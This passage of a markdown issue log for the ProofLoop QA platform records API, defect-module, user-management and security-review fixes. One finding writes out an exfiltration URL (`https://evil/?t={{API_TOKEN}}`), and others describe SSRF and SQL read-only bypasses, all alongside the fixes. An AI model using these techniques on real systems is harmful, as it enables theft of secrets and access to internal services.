| API-18 | ✅ | Spec | Sidebar entry is `/api-testing`; adding `/api-collections` to `IMPLEMENTED_NAV_PATHS` would have left the placeholder. | Nav path changed to `/api-collections` + project picker (tested). |
| API-19 | ✅ | Spec | No API to read a collection, so the builder page had no title and no way back to its project. | Added `GET /api-collections/:collectionId` (tenant-scoped, includes project name). |
| API-20 | ✅ | Spec | Builder used `-m-6` full-bleed (layout padding is `md:px-8`) and a fixed `w-72` sidebar → broken on phones. | Bordered master-detail, stacked below `md`; phone-width test checks no horizontal scroll. |
| API-21 | ✅ | Spec | `canCreateRequirement` used; "+" shown to VIEWERs; unlabelled name/endpoint/row inputs; tabs without tab roles; errors on hidden tabs invisible; details omitted params/auth/body and rendered `false`/`null` as blank; token placeholder `eyJh...` invited raw tokens. | `canManageApiIntelligence`; labels and `tablist`; "Fix the errors in: …" + tab markers; full details (auth shown as a summary, secret fields never rendered); `{{API_TOKEN}}` placeholders. |
| API-22 | ✅ | Impl | Builder sent `equals`/`contains` values for body/header assertions as strings, so `$.active equals false` or `$.count equals 3` could not be expressed. | Typed values (2026-11-10): `dataType` string/number/boolean/null, normalised on save, strict typed comparison in the engine, value-type selector in the builder (see API-39..43). |
| API-23 | ✅ | Spec | **`{{VARIABLE}}` references were not resolved** by the execution engine. | `{{baseUrl}}` from the environment (API-33) + environment variable vault (2026-11-10): `EnvironmentVariable` (key, value, isSecret), `GET/POST /api/environments/:id/variables`. Every `{{KEY}}` in endpoint, header values, query values, auth fields and body strings is substituted before the SSRF check; unresolved references → 400 naming them (never sent literally). Secrets: see API-48/51. |
| API-24 | ✅ | Spec | Spec's execute route had no `authenticate` (our router attaches it per route). | Added. Mutation: without it every caller, even ADMIN, got 401 (fails closed, but the feature is unusable). |
| API-25 | ✅ | Spec | **Security:** spec's `checkSSRF` claimed DNS-rebinding protection but axios did its own second DNS lookup, and redirects were followed without any check. | Layer 2: `http(s).Agent` with a checking `lookup`, so the checked IP is the connected IP on every hop. Layer 3: `beforeRedirect` blocks literal-IP and non-http(s) redirects (literal IPs skip DNS). `proxy: false` so `HTTP(S)_PROXY` cannot bypass the agents. Mutations: without layer 2 a redirect to `localhost:4000` reached the API; without layer 3 a redirect to `127.0.0.1:4000` did. |
| API-26 | ✅ | Spec | Spec's denylist missed `100.64.0.0/10`, `fd12::/16` (only `fd00:` prefix checked), `fe80::/10`, `::`, hex IPv4-mapped (`::ffff:7f00:1`), multicast/reserved ranges, and checked only the first DNS answer. | `net.BlockList` with IANA special-purpose ranges (v4 + v6), mapped addresses normalised, all DNS answers checked. Mutation with the spec's checks: `100.64.0.1` was requested. |
| API-27 | ✅ | Spec | Invalid endpoints (`{{baseUrl}}/x`, `/x`) made `new URL` throw → 500; `ftp:`/`file:` not rejected; only `ENOTFOUND` mapped. | 400 with a clear message; http(s) only; DNS failures (`ENOTFOUND`, `EAI_AGAIN`, …) → 400 "Endpoint host not found". |
| API-28 | ✅ | Spec | No response size limit (memory + DB); `responseBody: data \|\| null` turned bodies `0`, `false`, `""` into null. | `maxContentLength` 1 MB (oversized → FAILED, tested); body stored as received. Mutation: `0` stored as null. |
| API-29 | ✅ | Spec | Evaluator: `$.toString` / `$.__proto__` "existed" on every object; `null > -1` was true; `$.items[0]` unsupported; objects compared as `[object Object]`; `exists` failures read "expected 'undefined'". | Own properties only; numbers must be real numbers or numeric strings; `[n]` and `.n` indexes; objects compared as JSON; readable failure messages (all tested). |
| API-30 | ✅ | Spec | Any QA_ENGINEER could make the server call arbitrary public hosts with no rate limit. | Per-organization limit on `POST /api-requests/:id/execute` (express-rate-limit 8, default 30/min, `API_EXECUTION_RATE_LIMIT`); 429 + `RateLimit` headers. Tested: limit+1 → 429, other org unaffected. Still synchronous (10 s max per run); in-memory store: API-52. |
| API-31 | ✅ | Impl | Tests need one reachable local target, which the guard blocks. | Test-only `SSRF_ALLOWED_TARGETS=127.0.0.1:4999` (exact host:port), set only by `playwright.config.ts`; ignored with an error log when `NODE_ENV=production`. |
| API-32 | ✅ | Spec | Runner UI paste assumed queued execution (PENDING, "Waiting for worker", polling), but the engine is synchronous. | Decision: keep synchronous. UI polls only runs that are `PENDING` (max 60 × 1 s, cleared on unmount), so queued execution later needs no UI change. Polling path tested by simulating PENDING responses. |
| API-33 | ✅ | Spec | Run dialog promised "`{{baseUrl}}` will be resolved from this environment", but the backend ignored `environmentId` and `ApiExecution` had no `environmentId`. | `{{baseUrl}}` resolution (trailing slash, `{{ baseUrl }}` spacing, sub-paths); 400 for no environment / environment without base URL; environment must belong to the request's project; `ApiExecution.environmentId` (SetNull). The resolved URL is SSRF-checked (internal base URL → 403, tested). Mutation: without the project check, another organization's environment was accepted (201). |
| API-34 | ✅ | Spec | P1 again: `GET /api-executions/:id` (and the collection environments route) had no `authenticate`. | Added. Mutation: without it the route returned 500 (`req.user` undefined) instead of 401. |
| API-35 | ✅ | Spec | Polling `setInterval` was never cleared on unmount, and one shared `currentExecution` was shown under whichever request was selected. | Results kept per request; polling in an effect with cleanup. Mutation: shared result → another request showed the old result. |
| API-36 | ✅ | Spec | Console hid the response body whenever there was an error (exactly when it explains an assertion failure); "HTTP: 0" for network errors; hard-coded dark colours (`#0d1117`) broke light mode; run modal without Escape/labels (P9); Run shown to VIEWERs; `'./api-client'` (P4), `any`, no `encodeURIComponent`. | Error and body shown together (mutation-verified), "No response", theme tokens, P9 modal, writers only, typed client. |
| API-37 | ✅ | Spec | Paste added `GET /api-collections/:id/environments`, duplicating the existing `GET /projects/:projectId/environments`. | Reused the existing endpoint (builder already has the project id). |
| API-38 | ✅ | Spec | `GET /api-executions/:id` returned the full `responseBody` to VIEWERs; responses can contain secrets (e.g. a login response with a token). | VIEWERs get status, HTTP code and timing; body → `{ _redacted }`, error text → generic message (assertion messages quote response values). Tested incl. falsy body `0` and network errors. (`POST .../execute` is writers-only, so this is the only VIEWER path.) |
| API-39 | ✅ | Spec | Spec's `dataType` defaulted to `'string'`: numeric comparisons (`responseTime less_than 500`) cast the actual value to text and always failed, and rules saved before API-22 broke. | Server decides the type: status/responseTime/`greater_than`/`less_than` → number, `contains` → string, otherwise the chosen `dataType` or (old rules) the stored value's type. Mutation (default `'string'`): an old `status equals "200"` rule failed. |
| API-40 | ✅ | Spec | Spec's casts made missing/null values match: `Boolean(undefined)` = false (`$.missing equals false` passed), `Number(null)` = 0, `String(undefined)` = "undefined"; `Boolean("false")` = true. | Strict domains: values of another type, missing or null never match (`not_equals` passes for them). Header text "3"/"true" still compares as number/boolean. 13 typed cases tested. Mutation (spec casts): `$.missing not_equals false` failed. |
| API-41 | ✅ | Spec | Spec's `value: z.any()` undid API-07, and typed values were not validated (`"yes"` as boolean, `"abc"` as number accepted). | Scalar values only; per-type validation; stored normalised (`"TRUE"` → `true`, `"42"` → `42`, `""` → `null` for null type; `exists` stores no value/type). Tested. |
| API-42 | ✅ | Spec | Spec's VIEWER redaction used truthiness (`if (responseBody)`), so falsy bodies (`0`, `false`, `""`) were returned unredacted; it also dropped `include environment`. | `!== null` checks, environment kept. Mutation (truthiness): body `0` returned to VIEWER. |
| API-43 | ✅ | Spec | UI paste re-introduced `register` + `Controller` on the same field (API-16) and dropped the field labels. | Value-type selector added to the existing builder: labelled, disabled and fixed to Number/String where the API decides the type, value field read-only for Null; details show values as JSON plus type, so `"false"` and `false` differ (tested). |
| API-44 | ✅ | Spec | Variable routes were added to `environment.routes.ts`, which is mounted at `/api/projects` → `/api/projects/:environmentId/variables` (an environment id in a project URL, cf. ROUTE-02). | New `environment-variable.routes.ts` mounted at `/api` → `/api/environments/:environmentId/variables`, per-route `authenticate` (tested: the `/projects` path is 404). |
| API-45 | ✅ | Spec | P1 again: execute route lost `authenticate`, and the org-keyed limiter needs `req.user`, i.e. must run after it. | `authenticate, writers, executionRateLimiter`. Mutation (limiter first): keyed by IP, all organizations shared one budget (429 after 185 of 200). |
| API-46 | ✅ | Spec | Fixed 30/min would throttle the regression suite (~70 runs per org per minute); spec used `max` (deprecated name in express-rate-limit 8) and a `req.ip` fallback the library flags for IPv6. | `limit`, `API_EXECUTION_RATE_LIMIT` (Playwright: 200), `ipKeyGenerator` fallback, draft-7 `RateLimit` headers. |
| API-47 | ✅ | Spec | Spec called a non-existent `injectVariables` and looked the environment up by **organization**, undoing the per-project check (API-33). | `utils/variables.ts` `resolveRequest`; environment still scoped to the request's project (tested: foreign environment → 400). |
| API-48 | ✅ | Spec | **Security:** secrets were write-only for reads only – an editor could send `{{API_TOKEN}}` to their own server (`https://evil/?t={{API_TOKEN}}`) or an echo service and read it there. | Decision 2026-11-10: secrets are substituted only when the final URL host equals the environment's base-URL host (else 400 naming the variable, never the value); no base URL → 400; with secrets, redirects are not followed (3xx returned) so custom headers cannot be forwarded. Mutations: without binding the test secret was really sent to example.com (201); with redirects followed, 200 instead of 302. |
| API-49 | ✅ | Impl | Unresolved `{{KEY}}` would be sent literally; a plain-object lookup would treat `{{__proto__}}` / `{{constructor}}` as defined. | 400 `Unresolved variables: {{X}} (…)`; `Map` lookup (mutation: prototype keys resolved and the request ran). Stale texts fixed: endpoint error no longer says variables are not resolved; run dialog describes variables + secret binding. |
| API-50 | ✅ | Spec | P6 again: `catch (error: any)` + `error.code === 'P2002'`; a variable named `baseUrl` could shadow the environment's base URL. | `isUniqueViolation` + `handleError`; `baseUrl` key reserved (400, case-insensitive). |
| API-51 | ⚠️ | Spec | Vault gaps: secret values are stored in **plain text** (no encryption at rest); no update/delete endpoints (a secret cannot be rotated or removed); no UI to manage variables; if the trusted base-URL host echoes a secret, it is stored in `responseBody` (visible to writers). | Open – decide on encryption (key management), rotate/delete endpoints and a variables UI. |
| API-52 | ✅ | Impl | Rate limiter uses the in-memory store: the count is per API process and resets on restart. | Open – use a shared store (e.g. Redis, already in the stack) before running several API instances. **Fixed 2026-11-12:** rate-limit counters in Redis (`lib/rate-limit-store.ts`), in-memory fallback while Redis is down. |
| API-12 | ✅ | Spec | `body` was not redacted for VIEWERs, so credentials in request bodies (e.g. a login payload) were visible. | VIEWERs get `{ _redacted }` for any non-null body (`!== null`, so falsy `0` too). Tested; mutation (truthiness) leaked body `0`. |
| API-08 | ✅ | Spec | No `Project.apiCollections` back-relation, no index on `ApiExecution.requestId`. | Added. Cascade project → collections → requests → executions tested. |

---

## 11. Defect Intelligence (Module 10 backend)

| ID | Status | Source | Issue | Fix / verification |
|---|---|---|---|---|
| DEF-01 | ✅ | Spec | Spec said to *append* a `Defect` model, but one already existed (Phase 1) holding the 188 issue-log defects. Appending = duplicate model; replacing via `db push` would have dropped `defId` (rename = drop + add), dropped `expectedResult`/`actualResult` and failed on the new required `reporterId`. | Decision 2026-11-11 (spec shape, keep rows): JSON backup; SQL `RENAME COLUMN defId TO bugId` (+ unique index) so all 188 IDs survive; `reporterId` backfilled with admin@proofloop.qa; `db push --accept-data-loss` dropped only the two agreed columns; seed now writes Expected/Actual into `description`. Verified: 188 rows, 188 distinct IDs. |
| DEF-02 | ⚠️ | Spec | `reporter … onDelete: Restrict` also blocks deleting an **organization** that has defects (Postgres checks it during the user cascade, before the project → defect cascade). Test cleanup failed and left 12 orgs. `NoAction` was tried and behaves the same (verified), so the spec's `Restrict` was kept. | Teardown deletes defects first (tested both: blocked delete, then success after removing defects). **Open:** decide the deletion policy before org/user deletion exists (reassign reporter, soft-delete users, or optional reporter with SetNull). **Update 2026-11-11:** users are now soft-deleted (ORG section), so a reporter is never hard-deleted through the app; deleting an *organization* with defects is still blocked (no org deletion feature yet). |
| DEF-03 | ✅ | Spec | P1 again: `router.use(authenticate)` on the `/api` mount. | Per-route `authenticate`. Mutation: `/api/health` → 401. |
| DEF-04 | ✅ | Spec | P6 again: `catch (error: any)` + manual `ZodError` branches. | `handleError` + `isUniqueViolation`. |
| DEF-05 | ✅ | Spec | Update stored `stepsToReproduce: ''` as an empty string; update rules had no messages. | `''` clears to `null` (mutation-verified); messages match create. |
| DEF-06 | ✅ | Spec | Guards verified: test case must be in the same **project** (mutation: org-only scope accepted another project's test case); reporter is always the caller and `bugId`/`reporterId` cannot be changed via PATCH (tested). | – |
| DEF-07 | ✅ | Spec | No Defects UI: the sidebar entry 'Defect Intelligence' was a placeholder (UI-12). | Built 2026-11-11: project defects page (table, search, create/edit modal), project picker at `/defects`, project-page link (DEF-08..12). |
| DEF-08 | ✅ | Spec | UI paste did not compile: imported a non-existent `getTestCases` (real: `getProjectTestCases`); `'./api-client'` again (P4). | Fixed; typed client with `encodeURIComponent`. |
| DEF-09 | ✅ | Spec | Edit could never clear the steps or unassign: the paste turned `''` into `undefined` (= unchanged), while the API clears only on `''`. | Edit sends `''` as-is. Mutation (paste behaviour): the defect stayed assigned to 'Eve Lovelace'. |
| DEF-10 | ✅ | Spec | Linked-test-case dropdown was editable in edit mode, but the API does not accept `testCaseId` on update – the change was silently dropped. | Disabled in edit mode with a note (link fixed after creation, tested). |
| DEF-11 | ✅ | Impl | At phone width the whole page scrolled sideways by 348 px: the `sr-only` 'Actions' column header is `position:absolute` and, without a positioned ancestor inside the table's scroll container, it was laid out relative to `<main>` and stretched it. Found by the phone-width test; isolated with a probe (table container scrolled correctly; only this page widened). | `relative` on the table container. Mutation: 348 px overflow again. |
| DEF-12 | ✅ | Spec | `canCreateRequirement` used; 'Edit' visible only on hover (unreachable on touch, cf. UI-08); search field unlabelled; header (search `w-64` + button) too wide for phones; modal without Escape, field errors as `role=alert` (P9). | `canManageDefects`; always-visible labelled 'Edit BUG-…' buttons; `aria-label` search; wrapping header; P9 modal. |
| DEF-13 | ✅ | Spec | Traceability 'Active Bugs' total counts only defects linked to a requirement **through a test case**; defects without a test case or on standalone test cases are not counted, so the number can differ from the Defects page while reading like a project total. | Labelled 'Active Bugs (linked)' with an explanatory tooltip; controller documents the rule. Tested: CLOSED, standalone-test-case and unlinked defects excluded. |
| DEF-14 | ✅ | Spec | Coverage column showed 'Bug Free' for requirements without any test case, where no defect can be linked at all. | 'No Active Bugs' (tested: 'Bug Free' never shown). |
| DEF-15 | ✅ | Spec | Matrix patch: closed defects fetched then discarded in JS; `as any` to strip nested defects; stats bar (now 3 items) did not wrap; 'Active Bug(s)'. | `status: { not: 'CLOSED' }` in the query (mutation: closed defects appeared); typed destructuring keeps the `testCases` payload unchanged (mutation: nested `defects` key leaked); wrapping `<dl>`; singular/plural. |
| DEF-16 | ✅ | Impl | My Defects UI made the Bug ID `readOnly` in edit mode instead of the spec's `disabled` – based on the false react-hook-form claim (TEST-14/20). The user's supplied test expected `disabled`. | Restored `disabled` (react-hook-form 7.91 keeps the value, verified); own test updated to `toBeDisabled()`. |

---

## 12. Organization user management (soft delete)

| ID | Status | Source | Issue | Fix / verification |
|---|---|---|---|---|
| ORG-01 | ✅ | Spec | P1, worse: `router.use(authenticate)` **and** `router.use(requireRole(['ADMIN']))` on the `/api` mount – every unmatched `/api` request (incl. `/api/health`) → 401, and → 403 for logged-in non-admins. | Per-route `authenticate, admins`. Mutation: `/api/health` → 401. |
| ORG-02 | ✅ | Spec | **Security:** login checked `deletedAt` *before* the password, so anyone could learn that an email belongs to a deactivated account without knowing its password (cf. AUTH-03). | Password (or dummy hash) first; 403 'deactivated' only with the correct password; wrong password → the usual 401. Mutation (spec order): wrong password returned 403. |
| ORG-03 | ✅ | Spec | **Race:** last-admin safeguard is 'count admins, then update'. Two admins demoting or deactivating each other at the same moment both saw 2 admins. | SERIALIZABLE transaction; serialization failure → 409 'changed concurrently, please retry'. Tested 8 rounds each for demotion and deactivation (always exactly 1 admin left). Mutation (default isolation): the organization was left with **0 admins**. |
| ORG-04 | ✅ | Spec | Schema snippet used `role String`, but `role` is the `Role` enum (changing it would undo AUTH-12 typing); middleware patch read `decoded.userId`, the token carries `id`. | Only `deletedAt DateTime?` added (additive push); middleware adapted, keeping the separate 503 path (AUTH-11). |
| ORG-05 | ✅ | Impl | Deactivated users could still be assigned new defects. | Defect assignee must be an active user (mutation: assignment to a deactivated user succeeded). |
| ORG-06 | ✅ | Spec | P6 again: `catch (error: any)` + manual `ZodError`. | `handleError`; transaction rejections mapped explicitly. |
| ORG-07 | ⚠️ | Spec | No reactivation endpoint, and a deactivated user's email stays taken (unique), so they cannot re-register either. Sequential calls cannot reach the 'cannot deactivate the last administrator' rule (caller is an active admin and cannot target themselves) – it only applies under concurrency (ORG-03). | Open – add reactivation (and invitations, AUTH-24) in the Organization Settings UI step. |

---

## 13. Security & performance review (2026-11-12)

Dynamic probes (55 checks: headers, JWT forgery, RBAC, 24 cross-tenant requests, brute force) against a fresh
build, a static review of `apps/api` + `apps/worker`, and a load test (10 / 50 concurrent users, seeded
*ProofLoop Shop* data). Regression tests: `security-hardening-api.spec.ts`, `log-redaction.spec.ts`,
`password-reset-flow.spec.ts`.

| ID | Status | Severity | Issue | Fix / verification |
|---|---|---|---|---|
| SEC-01 | ✅ | CRITICAL | **Database Sentinel ran user SQL on the application database** when an environment had no connection string ("sandbox" fallback). Any QA_ENGINEER of any organization could read every tenant's users, password hashes, reset tokens and integration secrets. Reproduced: a freshly registered org read `"User"` rows of all 5 orgs. | Fallback removed (400 *No target database configured*). SEC-01 test. |
| SEC-02 | ✅ | HIGH | Sentinel connection string: no validation, no SSRF check (app DB on localhost, internal networks reachable), editable by QA_ENGINEER. | zod (postgres:// only), `assertSafeHost` on save **and** before every run, PUT limited to ADMIN/QA_LEAD (UI hides the button). |
| SEC-03 | ✅ | HIGH | Sentinel "read-only" was a regex only: side-effecting functions inside SELECT (`lo_create`, `pg_terminate_backend`, `set_config`) passed. | Query runs in `SET TRANSACTION READ ONLY` + `statement_timeout` 5 s. Test: `SELECT lo_create(0)` → 400, nothing created. |
| SEC-04 | ✅ | HIGH | `GET /projects/:id/environments` returned `dbConnectionString` (DB credentials) to every role incl. VIEWER. | `omit` on list + create. |
| SEC-05 | ✅ | MEDIUM | Slack webhook URL (a credential) returned to VIEWER / QA_ENGINEER; webhook saved without SSRF check; worker posted to it with raw `fetch` (redirects followed, no IP check). | Masked unless ADMIN/QA_LEAD (`hasWebhookUrl`); `assertSafeUrl` on save; worker posts only to `https://hooks.slack.com`, `redirect: 'manual'`, 10 s timeout. |
| SEC-06 | ✅ | MEDIUM | VIEWER could trigger side effects via GET: `root-cause?refresh=true` (LLM cost, overwrites hypothesis) and `quality-gate/evaluate?notify=true` (Slack spam). | 403 for VIEWER; cached hypotheses stay readable. |
| SEC-07 | ✅ | MEDIUM | Password reset: token stored in plain text (DB read = account takeover), reset link logged in every environment. | SHA-256 stored, lookup by hash; link logged only when `NODE_ENV !== 'production'`. |
| SEC-08 | ✅ | MEDIUM | No rate limit on login / register / forgot / reset (AUTH-14). Probe: 25 wrong passwords, no 429. | express-rate-limit per route (see AUTH-14). Probe: 429 at attempt 11. |
| SEC-09 | ✅ | LOW | Login response included `resetToken` / `resetTokenExpiry`. | Same public fields as register / me. |
| SEC-10 | ✅ | LOW | Malformed JSON / >1 MB body returned Express's HTML error page **with stack trace**; `/api/health` returned the raw driver error (host, port, DB name). | Final JSON error handler (400 / 413 / 500); health returns `db: 'down'` only. |
| SEC-11 | ✅ | LOW | `cors()` allowed every origin. | `CORS_ORIGINS` (default `FRONTEND_URL` or the Vite dev server). |
| SEC-12 | ✅ | LOW | `assertSafeUrl(AI_BASE_URL)` not awaited in `llm.service.ts` (guard ineffective; a rejection would be unhandled). | Awaited. |
| SEC-13 | ✅ | MEDIUM | Failed Jira/Slack calls logged the whole axios error incl. `Authorization: Basic <email:token>`. | `describeError()` (status + message only). `log-redaction.spec.ts`. |
| SEC-14 | ✅ | MEDIUM | A password reset does not invalidate existing JWTs (7-day tokens, no token version). | Open: add `passwordChangedAt` / `tokenVersion` checked in `authenticate` (schema change). **Fixed 2026-11-12:** `User.passwordChangedAt` set on reset; `authenticate` rejects tokens with an earlier `iat`. Test in `password-reset-flow.spec.ts`. |
| PERF-01 | ✅ | HIGH | **bcryptjs (pure JS, cost 12) blocked the event loop**: with 5 concurrent logins, every other request went from p50 6 ms to p50 1177 ms. Login throughput 2.6/s. | `utils/password.ts`: bcrypt in a `worker_threads` pool (same hashes). After: p50 7 ms during logins; 6.4 logins/s. |
| PERF-02 | ✅ | MEDIUM | `GET /projects/:id/reports`: 9 sequential queries; loaded full defect + test case rows to read 3 fields. | Parallel queries, narrow `select`. 10 users: p95 277 → 204 ms. At 50 users unchanged (~70–80 req/s, pool / single process bound). |
| PERF-03 | ✅ | MEDIUM | List endpoints are unpaginated: `GET .../defects` = 177 KB for 214 rows, p95 739 ms at 50 users. | Open: add cursor pagination (API + UI change). **Fixed 2026-11-12:** gzip `compression`; `GET .../defects?limit=&offset=&q=` (X-Total-Count; no `limit` = full list, backward compatible); defects page pages 50 at a time with server-side search; index `Defect(projectId, createdAt)`. |
| PERF-04 | ✅ | LOW | Single Node process; at 50 concurrent users heavy endpoints (reports, defects, quality gate) reach p95 650–980 ms. 0 errors in all runs. | Open: run several API instances (needs API-52 shared rate-limit store) and raise Prisma `connection_limit`. **Fixed 2026-11-12:** `dist/cluster.js` (`npm start`) runs `WEB_CONCURRENCY` processes; shared Redis rate-limit store; bcrypt pool split across processes. Quality gate: parallel queries, execution statuses counted with `groupBy`. |

---

## 8. Process

| ID | Status | Issue | Fix |
|---|---|---|---|
| PROC-01 | ✅ | User reported the issue log existed only as markdown – nothing logged in the ProofLoop Inc organization. | `seed-issue-log.cjs` stores every entry as a `Defect` row (see top of this file). |
